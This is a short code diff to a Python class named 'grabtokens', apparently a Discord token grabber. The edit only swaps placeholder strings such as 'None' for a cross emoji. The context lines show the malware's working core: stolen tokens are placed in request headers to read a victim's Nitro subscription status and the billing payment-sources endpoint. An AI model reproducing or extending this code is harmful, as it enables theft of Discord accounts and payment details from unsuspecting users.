@@ -239,7 +239,7 @@ class grabtokens():
             
             val_codes = []
             val = ""
-            nitro =""
+            nitro = "❌"
 
             headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                     'Content-Type': 'application/json',
@@ -270,12 +270,12 @@ class grabtokens():
                 elif r['premium_type'] == 2:
                     nitro = 'Nitro Boost'
             except BaseException:
-                nitro = 'None'
+                nitro = nitro
 
             b = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources",headers=headers).json()
 
             if b == []:
-                methods = "None"
+                methods = "❌"
             else:
                 methods = ""
                 try:
